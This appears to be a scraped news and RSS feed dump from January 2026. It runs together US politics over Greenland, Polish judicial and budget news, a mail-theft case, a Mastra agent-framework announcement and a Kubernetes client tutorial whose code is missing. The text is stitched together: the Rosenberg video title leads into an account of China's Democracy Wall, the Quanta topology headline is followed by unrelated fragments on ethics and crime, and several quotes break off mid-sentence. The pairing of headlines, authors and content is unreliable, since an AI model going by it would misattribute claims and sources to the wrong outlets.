hurt by not winning a prize that you were not even eligible for. It is certainly not rational to sabotage the country’s national security—emboldening Russia and China—over those hurt feelings.But here’s what’s actually happening: basically everyone in a position to do something about this is pretending everything is fine.The normalization machine is working overtime.The same people who would be absolutely losing their minds if any Democratic president sent a message like this to a foreign leader are now either silent or actively running interference. A decade ago, as a political rival, Ted Cruz once warned that we’d wake up one day to find a President Trump had nuked Denmark. And yet now he’s actively supporting Trump’s lunacy.Or take Missouri Senator Eric Schmitt. In December of 2024 after Trump was re-elected, but before he took office, the Senator went on TV to talk up how Trump was the non-interventionist President who would keep the US out of foreign wars.Well, I think that’s a longer discussion and a discussion that President Trump had in his first term. I do think we’re entering a new phase, though, of realism in this country.President Trump will be less interventionist, and we get back to our core national interests. Principally defending the homeland, the Indo-Pacific, and China, and so I think that’s a longer term conversation.We’ll make sure everybody is safe over there. That’s the first order of business, but, again,I think people have had enough of these forever wars all across the world. We can’t be everywhere all at once all the time. That’s just not our capability, so I think that I’m welcoming President Trump coming with this agenda.Yet, over the weekend he tweeted out a long thread arguing that “territorial expansion is a time-honored American tradition” and that it’s “in our blood” to acquire Greenland (leaving out that the examples he gave of the Louisiana Purchase and Alaska did not come with a mad President demanding we get the land or we’d attack).And the most galling part? Everyone knows. Everyone knows this is insane. The Republicans know it. The Democrats know it. Foreign leaders definitely know it. The Norwegian Prime Minister had to respond to an unhinged text message from the leader of the free world as if it were a normal diplomatic communication. Denmark’s foreign minister had to issue statements about how “you can’t threaten your way to ownership of Greenland” as if that’s a thing that should ever need to be said to an American president.Rep. Don Bacon, a Republican from Nebraska who is not seeking reelection (funny how that works), actually said what everyone is thinking. When he saw the letter, he simply tweeted: “Very embarrassing conduct.”That’s the most honest assessment you’ll get from a sitting Republican member of Congress. And notice he’s only willing to say it because he’s on his way out.What are the actual consequences here?Trump has now announced 10% tariffs on goods from the UK, Denmark, Norway, Sweden, France, Germany, the Netherlands, and Finland—all NATO allies—as punishment for not supporting his acquisition of Greenland. When asked if he’ll follow through, he said “100%.” It’s a silly question all around, but to date, much of the media had treated Trump’s weird infatuation with Greenland as if it were a joke, rather than deadly serious.When asked if he would use military force to seize Greenland, the President of the United States responded: “No comment.”The President won’t rule out military action against NATO allies because he didn’t get a peace prize.Because he didn’t get a  prize. Peace. Prize.The EU is holding an emergency summit. Denmark has said that U.S. military action in Greenland would spell the end of NATO. European allies are deploying troops—symbolic numbers, but troops nonetheless—to Greenland. We are watching in real-time as the post-World War II international order that the United States built and led for 80 years crumbles because one man’s ego couldn’t handle not getting an award.And Russian state media? They’re gloating. As the BBC reported, pro-Kremlin outlets are full of praise for Trump’s Greenland push, which kinda highlights that Trump’s claim that we need Greenland to protect us from Russia is bullshit. Russia is loving this mess. Putin couldn’t have designed a more effective way to fracture NATO if he’d tried. And he tried.“Standing in the way of the US president’s historic breakthrough is the stubbornness of Copenhagen and the mock solidarity of intransigent European countries, including so-called friends of America, Britain and France,” writes Rossiyskaya Gazeta.“Europe does not need the American greatness that Trump is promoting. Brussels is counting on ‘drowning’ the US president in the midterm congressional elections, on preventing him from concluding the greatest deal of his life.”This is not normal. Stop pretending it is.I’ve written before about how Techdirt has become something of a democracy blog, because when the fundamental institutions that allow for things like innovation and free speech are under attack, everything else becomes secondary. This is one of those moments.A President who openly admits his foreign policy is driven by personal grievances over awards he didn’t receive is not fit for office. A President who threatens to invade NATO allies and won’t rule out military force against them is a danger to global stability. A President who doesn’t understand (or doesn’t care) that the Nobel Committee is independent from the Norwegian government has no business conducting diplomacy.These aren’t controversial statements. They’re obvious. Everyone knows it.But none of the political elite want to act. For nearly a decade now there’s been this weird paralysis where opposing Trumpian nonsense is treated as simply not allowed. Why? Because his most vocal supporters might get upset? So fucking what. He’s ripping apart the global order over a personal grievance. He’s already destroyed so much goodwill and soft power that it will take decades to recover—if recovery is even possible.The fact that it’s taken until now to even begin discussing the 25th Amendment is already a travesty. That no one with actual power will do anything about it is the real indictment.We’re protecting a mad king because those who could stop it are too scared of random troll accounts on X (not to mention the world’s richest man) possibly mocking them for not being loyal enough to the mad king.]]></content:encoded></item><item><title>The Couple Who Gave Stalin the Bomb</title><link>https://www.youtube.com/watch?v=ygH5-W4DFpo</link><author>Newsthink</author><category>yt</category><enclosure url="https://www.youtube.com/v/ygH5-W4DFpo?version=3" length="" type=""/><pubDate>Tue, 20 Jan 2026 17:30:18 +0000</pubDate><source url="https://www.youtube.com/channel/UCIlU5KDHKFSaebYviKfOidw">Newsthink</source><content:encoded><![CDATA[Even in the face of death, Julius and Ethel Rosenberg refused to confess.

It centered around a brick wall near the Xidan intersection, where citizens posted "big-character posters" (dazibao) expressing grievances, ideas, and calls for reform. This wall became a symbol of grassroots activism, embodying themes of freedom and criticism amid the country's transition from the Cultural Revolution's chaos.

The movement emerged in the wake of Mao Zedong's death in 1976 and the subsequent arrest of the Gang of Four, creating a political vacuum. Deng Xiaoping, rising to power, initially tolerated the posters as they aligned with his efforts to rehabilitate victims of Mao-era purges and promote economic modernization. Posters criticized the excesses of the Cultural Revolution, demanded democratic reforms, and advocated for human rights, including freedom of speech and assembly. Wei Jingsheng's famous poster, "The Fifth Modernization," argued that true progress required democracy alongside Deng's "Four Modernizations" (agriculture, industry, defense, and science-technology).

Freedom was a core theme: activists sought liberation from authoritarian controls, inspired by Western ideas and China's own revolutionary history. Criticism targeted corruption, inequality, and the Communist Party's monopoly on power. However, this "Beijing Spring" was short-lived. By December 1979, as posters grew bolder—some even questioning Deng himself—the government cracked down. Wei was arrested, sentenced to 15 years in prison, and the wall was cleared. The movement highlighted the tension between reform and control in China, foreshadowing later events like the 1989 Tiananmen Square protests.

Though suppressed, Democracy Wall demonstrated the power of public criticism in challenging authoritarianism. It inspired future dissidents and remains a poignant reminder of unfulfilled democratic aspirations in China.]]></content:encoded></item><item><title>Greenland - Between Denmark and Trump | DW Documentary</title><link>https://www.youtube.com/watch?v=eyE5cO-v5p0</link><author>DW Documentary</author><category>yt</category><enclosure url="https://www.youtube.com/v/eyE5cO-v5p0?version=3" length="" type=""/><pubDate>Tue, 20 Jan 2026 17:01:16 +0000</pubDate><source url="https://www.youtube.com/channel/UCW39zufHfsuGgpLviKh297Q">DW Documentary</source><content:encoded><![CDATA[Greenland should become part of the United States — at least, that’s the opinion of US President Donald Trump. Talk of the US acquiring, or perhaps even seizing, the world's largest island with its vast mineral wealth has been causing concern not only among Greenlanders.

Denmark is outraged, as Greenland — a former colony — is still a semi-autonomous territory of the Danish Realm. But for how long? Many Greenlanders want to take control of their own future.
Nukannguaq Zeeb was born on the island and feels deeply connected to the island’s cultural traditions of hunting and fishing. He also coaches Greenland’s national soccer team, a sport introduced by Danish colonialists. He’s critical of Denmark’s ongoing influence. "To be honest, we are currently under Danish rule and not an independent country,” he says. Trump's neocolonial ambitions came as a shock to him.

Greenland did not gain any autonomy until 1953, when it became a Danish district. To this day, it remains closely associated with Denmark, both politically and economically. Many Greenlanders are pinning their hopes on the rich natural resources still hidden beneath the ice. As global warming accelerates, they could soon become accessible — drawing attention not only from the US administration.

The White Mountain mine lies north of the capital Nuuk and can only be reached by boat or helicopter. International investors are extracting anorthosite, a mineral used to produce insulation material and glass fiber, among other things.

Niels Ole is one of the few Greenlandic foremen in the mine — many skilled workers here come from abroad. Greenland’s weak education system means that many young people drop out before graduating. Social worker Ane Pipaluk looks after them. They live in shared housing and often come from families struggling with unemployment and alcoholism.

Negotiating a path between old and new dependencies poses a major challenge for Greenland. Niels Ole dreams of more autonomy for his homeland. He says, "It's the dream of many Greenlanders.”

It’s kind of fun looking back since we were only a few months into building at the time. The HN community gave a lot of enthusiasm and some helpful feedback.Today, we released Mastra 1.0 in stable, so we wanted to come back and talk about what’s changed.If you’re new to Mastra, it's an open-source TypeScript agent framework that also lets you create multi-agent workflows, run evals, inspect in a local studio, and emit observability.Since our last post, Mastra has grown to over 300k weekly npm downloads and 19.4k GitHub stars. It’s now Apache 2.0 licensed and runs in prod at companies like Replit, PayPal, and Sanity.Agent development is changing quickly, so we’ve added a lot since February:- Native model routing: You can access 600+ models from 40+ providers by specifying a model string (e.g., `openai/gpt-5.2-codex`) with TS autocomplete and fallbacks.- Guardrails: Low-latency input and output processors for prompt injection detection, PII redaction, and content moderation. The tricky thing here was the low-latency part.- Scorers: An async eval primitive for grading agent outputs. Users were asking how they should do evals. We wanted to make it easy to attach to Mastra agents, runnable in Mastra studio, and save results in Mastra storage.- Plus a few other features like AI tracing (per-call costing for Langfuse, Braintrust, etc), memory processors, a `.network()` method that turns any agent into a routing agent, and server adapters to integrate Mastra within an existing Express/Hono server.(That last one took a bit of time, we went down the ESM/CJS bundling rabbithole, ran into lots of monorepo issues, and ultimately opted for a more explicit approach.)Anyway, we'd love for you to try Mastra out and let us know what you think. You can get started with `npm create mastra@latest`.We'll be around and happy to answer any questions!]]></content:encoded></item><item><title>Two Twisty Shapes Resolve a Centuries-Old Topology Puzzle</title><link>https://www.quantamagazine.org/two-twisty-shapes-resolve-a-centuries-old-topology-puzzle-20260120/</link><author>Elise Cutts</author><category>Quanta Magazine</category><category>tech</category><enclosure url="https://www.quantamagazine.org/wp-content/uploads/2026/01/Bonnet-Pairs-cr-Mark-Belan-Default.webp" length="" type=""/><pubDate>Tue, 20 Jan 2026 16:12:36 +0000</pubDate><source url="https://www.quantamagazine.org/">Quanta Magazine</source><content:encoded><![CDATA[Imagine if our skies were always filled with a thick layer of opaque clouds.

--

Jo the First is a ruthless dictator who rules with an iron fist. To most onlookers, his rule appears cruel and unjust. But for his beloved son JoJo, this life is all he’s ever known and he grows up to inherit his father’s role and style of rule. Given JoJo’s unusual upbringing, does he bear full moral responsibility for his actions? Michael Vazquez and Sarah Stroud dig into this ethical dilemma.

Theists who believe in God and avoid the problem of evil delude themselves. If there is a God, evil is God’s hardest problem to explain. If there is no God, evil is the easiest evidence supporting a lack of God. Theologians have no tougher task than explaining evil’s enormity. They have devised clever, even profound, explanations and justifications. Do they pass the smell test?

To subscribe to Court Watch, click A serial mail thief’s alleged robbery spree ended after he posted photos of stolen credit cards and bins of mail to his Instagram Stories on the same day he robbed a carrier at knifepoint.Jordan McCorvey, a 32-year-old man in Ohio, allegedly robbed a USPS letter carrier’s truck while they were on their delivery route on November 28. The carrier told investigators two men approached their truck with a knife and demanded access to the truck, according to , and when the carrier unlocked the truck and gave them access, they took a tray of mail.The description of one of the suspects matched a man who investigators already knew as “a known mail thief with criminal history related to possession of stolen mail and bank fraud,” the complaint says. The same day as the theft, McCorvey’s Instagram accounts—with the usernames "2corkmoney," "Icorkmoneybaby," and "cork2saucy”—posted photos of him flipping through stacks of mail still in the USPS tray, showing the same zip code on the letters as the carrier’s stolen deliveries. For the next few days, more evidence appeared on McCorvey’s Instagram Stories, where he uploaded photos and videos “involving banking transactions and other various posts connected to financial institutions,” according to the complaint. “These posts included solicitations for individuals with bank accounts or other related financial information.”In one photo, a man—it’s not clear from the complaint whether it’s McCorvey— celebrates in front of a Wells Fargo ATM, holding a card in the air, with a Wells Fargo branch tagged as a location sticker on the photo. This isn’t the first time an alleged criminal outed himself by bragging on social media and in public. Idriss Qibaa, the man who ran an extortion scheme called Unlocked4Life.com that promised to unlock clients’ social media accounts, admitted on the popular No Jumper podcast that he was the one locking people’s accounts to extort them out of thousands of dollars, which helped the FBI charge him.McCorvey was arrested on January 9 in Columbus. Mail theft is a federal crime and McCorvey could face fines and up to five years in prison.]]></content:encoded></item><item><title>Inside the World&apos;s Most Lethal Drone Unit That Cost Putin $12B</title><link>https://www.youtube.com/shorts/wNXW8Ln13Gs</link><author>The Wall Street Journal</author><category>yt</category><enclosure url="https://www.youtube.com/v/wNXW8Ln13Gs?version=3" length="" type=""/><pubDate>Tue, 20 Jan 2026 15:01:49 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">The Wall Street Journal</source><content:encoded><![CDATA[Nearly four years into the Russia-Ukraine War, drones have gone from battlefield experiments to indispensable, scalable machines of destruction.

We cannot do what we do without your support.A court has ruled that a couple’s divorce did not legally take place because it was granted by a judge who had been illegitimately appointed due to the former Law and Justice (PiS) government’s judicial reforms.The case, which has drawn comment from both the current justice minister and his PiS predecessor, has highlighted how the dispute over the rule of law in Poland can impact citizens’ everyday lives.The ruling in question was issued by the district court in Giżycko, a small town in northeastern Poland, which rejected an application for the division of property after divorce, saying the divorce decree was invalid, reports legal news service Prawo.pl.That was because the judge who granted the divorce was appointed to his position via the National Council of the Judiciary (KRS) after that body had been overhauled by PIS in a manner that placed it under greater political control and rendered it illegitimate, according to various rulings by Polish and EU courts.The KRS, which is responsible for nominating judges, is at the heart of Poland’s rule-of-law dispute. In particular, the status of thousands of judges (often referred to as “neo-judges”) appointed after the KRS was reformed by PiS, and the rulings issued by them, has been called into question.Commenting on the case in Giżycko, justice minister Waldemar Żurek said that it underscored the need for urgent reform of the justice system, noting that parliament would this week begin work on the two bills.“The case in which a divorce judgement was deemed non-existent…reveals something deeply disturbing,” wrote Żurek on social media. “The crisis surrounding neo-judges is now infiltrating the most sensitive areas of citizens’ lives. Into family matters, property issues and the fundamental sense of legal security.”The situation has “generated chaos in the courts, and led to situations where people do not know whether their judgements even exist”, he added. “That is why this problem must be resolved”.However, Zbigniew Ziobro, who served as justice minister under the former PiS government, blamed the current administration for the situation, saying that they had “brought about the real chaos and anarchy” by questioning judicial appointments.He also accused them of hypocrisy, noting that they do not question rulings by “neo-judges” when it suits their interests. As an example, he pointed to a 2023 case in which Żurek won in court against a bank in a judgement issued by a judge appointed after the disputed reforms.Ziobro was recently granted asylum by Hungary, where he fled rather than face charges in Poland for a variety of alleged crimes committed while he was justice minister. He argues that the case against him is an act of “political revenge” by the current government.According to Prawo.pl, judges say the case in Giżycko is far from the first such instance involving family matters such as divorce.One unnamed Supreme Court judge said that there is already a line of jurisprudence in the city of Olsztyn under which family law decisions issued by “neo-judges” are treated as legally non-existent.“Such rulings show that there is chaos at many levels in the Polish justice system,” said Katarzyna Wróbel-Zumbrzycka, a member of Iustitia, a Polish judges’ association that opposed PiS’s reforms. “It needs to be cleaned up, first and foremost for the people, so that such situations do not happen again.”In 2019, Poland’s Supreme Court ruled that, due to PiS’s reforms, “the KRS is not an impartial and independent body” as it had been rendered “dependent on the executive authorities”. In 2022, the same court found the KRS to no longer be consistent with its role outlined in the constitution.In 2021, the European Court of Human Rights likewise found the overhauled KRS was no longer independent from legislative or executive powers. The same year, Poland became the first country ever to be expelled from the European Network of Councils for the Judiciary.

DESCRIPTION
Olimpiu Pop speaks with Andrew Lamb, staff engineer at InfluxData and PMC member of Apache DataFusion and Apache Arrow, about how modern data systems are built using standardized open source components rather than being developed from scratch.

Andrew discusses the FDAP Stack (Flight, DataFusion, Arrow & Parquet), the shift from row-based to columnar data storage, and how technologies like Apache Iceberg are enabling a new era of interoperability across data platforms. The discussion covers why this modular approach saves years of development time while providing better performance and compatibility.

And lawmakers like Ted Cruz, which we’ve also documented repeatedly, have shown time and time again how they aren’tinterested in protecting kids (from tech giants or anything else), or doing any of the heavy lifting (like, say ensuring everyone has access to affordable mental health care or affordable broadband) required to .More specifically, Cruz leveraged the Congressional Review Act to kill FCC modifications to the E-Rate program that allowed school libraries to offer kids free Wi-Fi hotspots. This was a broadly popular, uncontroversial program that made it easier for rural, low-income kids to get online. And Cruz killed it because companies like AT&T don’t want the government offering alternatives to their overpriced service.Cruz, of course, couldn’t just openly announce that telecom lobbyist corruption resulted in him killing a helpful program with broad, bipartisan support. So he made up a whole bunch of bullshit about how this Wi-Fi program was “censoring Conservative viewpoints” and resulting in kids running amok unsupervised online. As we debunked in detail it was all lies; he just threw a bunch of nonsense at the wall, and our lazy, shitty press parroted much of it unskeptically. “During the Biden administration, not only did Congressional Democrats give billions of dollars to the FCC to buy personal internet devices for children, but the Biden FCC sought to bankroll kids’ unsupervised internet access and undermine parental rights by expanding the E-Rate program to install Wi-Fi hotspots off campus, including on school buses and in students’ homes.“Cruz is, as usual, lying. The expanded Wi-Fi hotspot program didn’t cost the FCC any additional taxpayer money whatsoever. They leveraged existing E-Rate funds to ensure the most disadvantaged, rural kids (many of whose parents voted for Trump) had access to affordable Internet when not on school grounds, either via a cheap access point at home, or a cheap access point on a local bus or bookmobile.Again, the Republican opposition to this wasn’t rooted in any sort of good intention. AT&T and Verizon simply don’t like the precedent of the government offering affordable (or free) broadband internet access to people. Even people in areas their networks don’t reach. They’d much rather those families be stuck paying an arm and a leg for spotty, expensive, often unreliable broadband access. Cruz dressed up his lazy corruption as some sort of noble “protection of the children,” a pretty common refrain in DC policy circles. And because the U.S. press generally sucks (in part due to the Republican assault on media consolidation and ownership limits), he was broadly allowed to lie repeatedly about this without being seriously challenged in the media. To make matters worse, he’s leveraging his corrupt protection of the Republican-coddled telecom industry as some sort of noble justification for passing shitty, half-cooked legislation on a completely different front. But as is so often the case, the “protect the children” and race-baiting, culture war trolling generally exists to divide and disorient the public so they don’t cooperatively target the real problem: rich assholes. In the case of KOSKA, as we saw with the fake GOP antitrust inquiries into “big tech,” or fake concerns about “free speech,” Cruz’s interest isn’t in actually reining in big tech or helping kids. His interest is in finding leverage points over modern media giants that can be used to bully them into protecting and coddling authoritarians and their rank propaganda, a gambit that’s proven to be quite successful so far.]]></content:encoded></item><item><title>Show HN: Ocrbase – pdf → .md/.json document OCR and structured extraction API</title><link>https://github.com/majcheradam/ocrbase</link><author>adammajcher</author><category>hn</category><pubDate>Tue, 20 Jan 2026 13:10:08 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Poland bans Chinese cars from military bases</title><link>https://notesfrompoland.com/2026/01/20/poland-bans-chinese-cars-from-military-bases/</link><author>Daniel Tilles</author><category>news</category><pubDate>Tue, 20 Jan 2026 11:02:24 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers.

In response, China has called on Poland not to “Last week, news website Interia first reported that military personnel driving Chinese vehicles were being barred from entering some facilities as a result of tightened security requirements regarding the protection of military sites and critical infrastructure.Modern cars are fitted with an array of sensors that gather data, and there are fears that Chinese manufacturers may share that data with the Chinese authorities.Subsequently, news service CyberDefence24 reported that it had been informed of a case in which the driver of a Tesla had been denied entry to the base of the Paulina Uznańska, deputy head of the China department at the Centre for Eastern Studies (OSW), told Interia that Tesla produces some of its vehicles in China and also operates a data centre there.The defence ministry later confirmed to Interia that the Military Counterintelligence Service (SKW) had in 2025 “issued guidelines on how to protect military facilities in connection with threats resulting from the use of various devices manufactured in China”.Last year, the 2022 Homeland Defence Act was toughened, with new guidelines on its ban on producing or transmitting images or video of locations of particular importance for national security or defence.Those restrictions “In a further statement to the Polish Press Agency (PAP), the ministry also confirmed reports that it is working on a more comprehensive policy “to restrict the entry of Chinese-made vehicles into the protected military units and facilities”.Broadcaster Polskie Radio reported, citing sources, that the measures would see Chinese vehicles banned not only from military bases themselves, but even from, for example, car parks nearby.In response to those reports, the spokesman for China’s foreign ministry, Guo Jiakun, told PAP that Beijing had “taken note” of the issue and he warned that “Sales of Chinese cars in Poland rose rapidly in 2025. In December, 9,821 were registered in the country, over four times more than in the same period a year earlier, according to data cited by broadcaster RMF. Over 2025 as a whole, Chinese brands accounted for 14.5% of all newly registered passenger cars.

          rules. It begins with a single cell. Over time, cells repeatedly
          decide whether to  and/or . The nearby sliders
          adjust the probability of each action occurring.
        
          When a cell splits, it creates a new cell pointed in a slightly
          different direction. Decreasing the maximum turn angle causes cells to
          grow in straighter lines.
        
          Only the youngest cells get to grow or split. After a certain age,
          cells become dormant. This threshold age is defined as a percentile on
          the distribution of cell ages at any given time. Increasing the
          threshold means more cells will be active.
        
          Cells leave a signal in the location they were created. This effectively
          broadcasts their presence so that others won't grow or split on top of
          them. Increasing the decay rate enables faster regrowth, but also makes
          it more likely that cells will grow on top of each other.
        
          When cells reach a fixed maximum age, they die.

We cannot do what we do without your support.Opposition-aligned President Karol Nawrocki has signed the state budget for 2026 into law despite expressing strong reservations about the government’s management of the economy.He called it a “budget of chaos”, but also acknowledged that, if he had taken the unprecedented decision not to sign the budget, it would have caused even greater uncertainty.At the same time as signing the bill, Nawrocki also referred it to the Constitutional Tribunal (TK) for assessment. However, any decision the TK makes will be ignored by the government, which regards the tribunal as illegitimate.Unlike other bills, the budget act cannot be vetoed by the president. When it was sent to Nawrocki by parliament last Tuesday, the president had one week to decide between three options.He could have simply signed the bill into law – always an unlikely choice for an opposition-aligned president who has regularly clashed with the government.The second option was to sign it into law while also sending it to the TK for assessment, as was done by Nawrocki’s predecessor, Andrzej Duda, also an opposition ally, in each of the last two years.Finally, he could have refused to sign the budget and at the same time sent it to the TK. No president has ever taken that option, and doing so would have created weeks, and possibly months, of fiscal and legal uncertainty.Last week, Nawrocki said that he still did “not know what I will do” and remained “open to every possibility”. However, on Tuesday evening, the president announced that he had opted for option number two.It means that the TK has up to two months to assess the budget and issue a ruling on its constitutionality. In the meantime, the budget goes into force as normal.Given that the TK is stacked with opposition-aligned judges, it is likely to find fault with the budget. But it will almost certainly be ignored (as it was last year) by the government, which does not recognise the TK because it contains judges unlawfully appointed by the former Law and Justice (PiS) government.In a recorded speech, the president declared that the budget is “evidence of a deep crisis of credibility in the current government” and “demonstrates a helpless capitulation to the challenges facing Poland”.In particular, Nawrocki criticised its impact on the level of debt, noting that it is the second year in a row in which the deficit is equivalent to almost a third of total spending.“Poland has faced questions over its public finances in recent years. In 2024, the European Union placed Poland under its excessive deficit procedure, requiring it to take steps to bring the deficit, which stood at 6.5% of GDP that year, to below the EU target of 3%.The deficit in fact rose to an estimated 6.8% of GDP in 2025 but is now forecast to decline to 6.3% in 2026 and 6.1% in 2027, according to the European Commission.However, despite his concerns over the budget, Nawrocki said that refusing to sign it into law “would not solve any of the problems we face” but would “pose a risk to the stability and predictability of state affairs”.Finance minister Andrzej Domański has, by contrast, called the government’s spending plans “a budget for an ambitious and secure Poland”, with a focus on “investments in innovation, digitisation and the competitiveness of our economy”.In response to Nawrocki’s decision, Domański issued a brief statement: “The president has signed the budget. A budget of investments and record-high defence spending. The rest, including referring the bill to the Constitutional Tribunal, is political theatre with no real consequences. We continue working.”Poland’s defence spending, which was already at the highest relative level in NATO, will now rise further to just over 200 billion zloty (€47.4 billion), the equivalent of 4.8% of GDP, this year. The budget also devotes 249 billion zloty, 6.8% of GDP, to healthcare.

We cannot do what we do without your support.The office of Polish President Karol Nawrocki has confirmed that he has been invited to join Donald Trump’s new International Board of Peace.The US president has invited dozens of world leaders to join the body, including Vladimir Putin and Alexander Lukashenko, the presidents of Russia and Belarus – two countries that Poland accuses of mounting ongoing “hybrid warfare” operations against it.Early on Monday afternoon, Polish news website Onet cited sources saying that Nawrocki, who is a close ally of Trump, had been invited to join the board. That followed a public announcement by Hungarian Prime Minister Viktor Orbán, another Trump ally, that he had accepted an invitation.Later on Monday, Nawrocki’s chief foreign policy aide, Marcin Przydacz, announced at a press briefing that he “can confirm that President Karol Nawrocki received an invitation from Donald Trump to participate in the work of this council”.He added that the issue “will be the subject of discussions with the American side in the near future”. Regarding what decision Nawrocki would make, Przydacz said that it would be communicated to Washington before being announced publicly.The Board of Peace was established as part of Trump’s efforts to bring peace in Gaza. On Friday, he called it “the Greatest and Most Prestigious Board ever assembled at any time, any place”.Its seven-man executive board includes US Secretary of State Marco Rubio, Trump allies Steve Witkoff and Jared Kushner, as well as former British Prime Minister Tony Blair and World Bank President Ajay Banga.However, reports suggest that Trump has broader aims for the new board than just Gaza, seeing it as a vehicle for pursuing his foreign policy elsewhere. on Sunday published the full text of the board’s charter – which was attached to invitations sent to world leaders – and notes that it does not mention Gaza at all. Bloomberg also reported that Trump has asked countries that want a permanent spot on the board to pay $1 billion.On Monday, Kremlin spokesman Dmitry Peskov confirmed that Putin had received an offer to join the board and would now seek further clarification from the Americans about the details.Belarus also announced that it had been invited to become a founding member of the board and said that it was “ready to take part, taking into account and hoping that this organisation will expand its scope and authority far beyond the mandate proposed in the initiative”.Putin and Lukashenko’s potential membership of the board represents a significant problem for Nawrocki. The Polish president is ardently anti-Russia, as are most Poles. Meanwhile, Russia has in recent years carried out a campaign of sabotage, cyberattacks and disinformation.Belarus has created a migration and security crisis on Poland’s eastern border by encouraging and assisting tens of thousands of migrants – mainly from the Middle East, Asia and Africa – to try to illegally cross. Poland and its EU partners have described those actions as part of the Russian-led “hybrid war”.When announcing Nawrocki’s invitation from Trump, Przydacz acknowledged that “politicians with whom the Polish president is in no way aligned are also being invited” to join the board, reports broadcaster TVN.“Vladimir Putin is certainly such a politician,” he added. “We have extremely different assessments and opinions of the international situation, and extremely different goals regarding international policy. However, in diplomacy, it is never the case that you can only talk to those with whom you agree 100%.”Przydacz also noted that Poland recently received an invitation from the US to attend this year’s G20 summit, which was “considered a great success” even though Russia is also part of the G20.Rafał Chwedoruk, a political scientist at the University of Warsaw, told Onet that the invitation to join the board is Nawrocki’s “first serious external test” since becoming president last August.He noted that any discussions over the issue would have to involve the government of Prime Minister Donald Tusk, with which Nawrocki, who is aligned with the right-wing opposition, is regularly in conflict.Poland’s president is traditionally mainly a figurehead in foreign policy, with the government making major decisions and running day-to-day affairs. However, Nawrocki has sought to break the mould and play a great role in both domestic and international affairs.After news of Nawrocki’s invitation was confirmed, Tusk took to social media to remind the president that accession to international organisations requires the consent of the government and ratification by parliament.“The government will be guided solely by the interests and security of the Polish state,” wrote the prime minister. “And we will not let anyone play us.”Tusk, a former president of the European Council, leads a government that is generally pro-EU and has frosty relations with Trump. Earlier this month, he joined other European leaders in issuing a joint statement calling on the US to respect Denmark’s sovereignty over Greenland.Nawrocki, by contrast, told the BBC in an interview shortly afterwards that “discussion should remain a matter between the prime minister of Denmark and President Trump”. He also declared that Trump is the only leader capable of protecting Europe from the threat of Russia.

especially if you've considered making your client usable as a  plugin,
you might have wondered how to make your client feel familiar to users of .
A quick glance at the output of  might put a damper on that:
"Am I really supposed to implement all those options?"Fear not, others have done a lot of the work involved for you.
In fact, the Kubernetes project provides two libraries to help you handle
-style command line arguments in Go programs:
 and

(which uses ).
This article will show how to use the former.As might be expected since it's part of ,
's ultimate purpose is to provide an instance of

that can issue requests to an API server.It follows  semantics:defaults are taken from  or equivalent;files can be specified using the  environment variable;all of the above settings can be further overridden using command line arguments.It doesn't set up a  command line argument,
which you might want to do to align with ;
you'll see how to do this
in the "Bind the flags" section. allows programs to handle selection (using );client certificates and private keys;HTTP Basic authentication support (username/password).In various scenarios,  supports  configuration settings:
 can specify multiple files whose contents are combined.
This can be confusing, because settings are merged in different directions
depending on how they are implemented.
If a setting is defined in a map, the first definition wins,
subsequent definitions are ignored.
If a setting is not defined in a map, the last definition wins.When settings are retrieved using ,
missing files result in warnings only.
If the user explicitly specifies a path (in  style),
there must be a corresponding file.If  isn't defined,
the default configuration file, , is used instead,
if present.The general usage pattern is succinctly expressed in
the  package documentation:In the context of this article, there are six steps:Configure the loading rulesclientcmd.NewDefaultClientConfigLoadingRules() builds loading rules which will use either the contents of the  environment variable,
or the default configuration file name ().
In addition, if the default configuration file is used,
it is able to migrate settings from the (very) old default configuration file
().You can build your own ,
but in most cases the defaults are fine.clientcmd.ConfigOverrides is a  storing overrides which will be applied over the settings loaded from the configuration derived using the loading rules.
In the context of this article,
its primary purpose is to store values obtained from command line arguments.
These are handled using the pflag library,
which is a drop-in replacement for Go's  package,
adding support for double-hyphen arguments with long names.In most cases there's nothing to set in the overrides;
I will only bind them to flags.In this context, a flag is a representation of a command line argument,
specifying its long name (such as ),
its short name if any (such as ),
its default value,
and a description shown in the usage information.
Flags are stored in instances of
the  struct.Three sets of flags are available,
representing the following command line arguments:authentication arguments (certificates, tokens, impersonations, username/password);cluster arguments (API server, certificate authority, TLS configuration, proxy, compression)context arguments (cluster name,  user name, namespace)The recommended selection includes all three with a named context selection argument and a timeout argument.These are all available using the  functions.
The functions take a prefix, which is prepended to all the argument long names.So calling
clientcmd.RecommendedConfigOverrideFlags("")
results in command line arguments such as , , and so on.
The  argument is given a default value of 0,
and the  argument has a corresponding short variant, .
Adding a prefix, such as , results in command line arguments such as
, , etc.
This might not seem particularly useful on commands involving a single API server,
but they come in handy when multiple API servers are involved,
such as in multi-cluster scenarios.There's a potential gotcha here: prefixes don't modify the short name,
so  needs some care if multiple prefixes are used:
only one of the prefixes can be associated with the  short name.
You'll have to clear the short names associated with the other prefixes'
 , or perhaps all prefixes if there's no sensible
 association.
Short names can be cleared as follows:In a similar fashion, flags can be disabled entirely by clearing their long name:Once a set of flags has been defined,
it can be used to bind command line arguments to overrides using
clientcmd.BindOverrideFlags.
This requires a

rather than one from Go's  package.If you also want to bind , you should do so now,
by binding  in the loading rules:Build the merged configurationTwo functions are available to build a merged configuration:As the names suggest, the difference between the two is that the first
can ask for authentication information interactively,
using a provided reader,
whereas the second only operates on the information given to it by the caller.The "deferred" mention in these function names refers to the fact that
the final configuration will be determined as late as possible.
This means that these functions can be called before the command line arguments are parsed,
and the resulting configuration will use whatever values have been parsed
by the time it's actually constructed.The merged configuration is returned as a
 instance.
An API client can be obtained from that by calling the  method.If no configuration is given
( is empty or points to non-existent files,
 doesn't exist,
and no configuration is given using command line arguments),
the default setup will return an obscure error referring to .
This is legacy behaviour;
several attempts have been made to get rid of it,
but it is preserved for the  and  command line arguments in .
You should check for "empty configuration" errors by calling clientcmd.IsEmptyConfig()
and provide a more explicit error message.The  method is also useful:
it returns the namespace that should be used.
It also indicates whether the namespace was overridden by the user
(using ).Here's a complete example.Happy coding, and thank you for your interest in implementing tools with
